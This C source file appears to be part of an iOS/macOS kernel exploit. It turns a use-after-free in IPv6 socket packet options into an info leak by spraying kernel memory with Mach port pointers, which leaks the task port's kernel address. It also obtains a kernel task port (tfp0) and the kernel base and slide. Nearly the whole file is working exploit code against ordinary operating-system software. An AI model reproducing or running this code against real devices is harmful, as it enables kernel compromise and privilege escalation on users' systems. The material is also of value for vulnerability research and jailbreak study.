#include <stdio.h>
#include <mach/mach.h>
#include "krw.h"
#include "socket.h"
#include "helper.h"

mach_port_t tfp0;

extern uint64_t kbase;
extern uint64_t kslide;

extern uint64_t kmsg_buffer;

extern uint64_t dangling_kptr_from_port;

// first primitive: leak the kernel address of a mach port
uint64_t find_port_via_uaf(mach_port_t port, int disposition) {
    // here we use the uaf as an info leak
    int sock = get_socket_with_dangling_options();

    INFO("sock_fd: %u\n", sock);
    uint64_t dangling_kptr_from_socket_fd = get_dangling_ip6_pktopts_kaddr(sock);
    INFO("obtained dangling_kptr from socket_fd, 0x%llx\n", dangling_kptr_from_socket_fd);
    
    for (int i = 0; i < 0x10000; i++) {
        // since the UAFd field is 192 bytes, we need 192/sizeof(uint64_t) pointers
        mach_port_t p = fill_kalloc_with_port_pointer(port, 192/sizeof(uint64_t), MACH_MSG_TYPE_COPY_SEND);
        
        int mtu;
        int pref;
        get_minmtu(sock, &mtu); // this is like doing rk32(options + 180);
        get_prefertempaddr(sock, &pref); // this like rk32(options + 184);
        
        // since we wrote 192/sizeof(uint64_t) pointers, reading like this would give us the second half of rk64(options + 184) and the fist half of rk64(options + 176)
        
        /*  from a hex dump:
         
         (lldb) p/x HexDump(options, 192)
         XX XX XX XX F0 FF FF FF  XX XX XX XX F0 FF FF FF  |  ................
         ...
         XX XX XX XX F0 FF FF FF  XX XX XX XX F0 FF FF FF  |  ................
                    |-----------||-----------|
                     minmtu here prefertempaddr here
         */
        
        // the ANDing here is done because for some reason stuff got wrong. say pref = 0xdeadbeef and mtu = 0, ptr would come up as 0xffffffffdeadbeef instead of 0x00000000deadbeef. I spent a day figuring out what was messing things up
        if(dangling_kptr_from_port == dangling_kptr_from_socket_fd)
            INFO("DANGLING KPTR REUSED!!!!!!\n");
        khexdump(dangling_kptr_from_socket_fd, 0xc0);

        uint64_t ptr = (((uint64_t)mtu << 32) & 0xffffffff00000000) | ((uint64_t)pref & 0x00000000ffffffff);
        
        if (mtu >= 0xffffff00 && mtu != 0xffffffff && pref != 0xdeadbeef) {
            mach_port_destroy(mach_task_self(), p);
            close(sock);
            return ptr;
        }
        mach_port_destroy(mach_task_self(), p);
    }
    
    // close that socket.
    close(sock);
    return 0;
}

int main() {
	
   	int ret = host_get_special_port(mach_host_self(), HOST_LOCAL_NODE, 4, &tfp0);
	printf("ret: 0x%x, hsp4: 0x%x\n", ret, tfp0);

	int r = get_kbase(&kbase);
    printf("get_kbase ret: %d, kbase: 0x%llx, kslide: 0x%llx\n", r, kbase, kslide);

	uint64_t self_port_addr = find_port_via_uaf(mach_task_self(), MACH_MSG_TYPE_COPY_SEND);
    INFO("our task port: 0x%llx\n", self_port_addr);

	
	return 0;
}
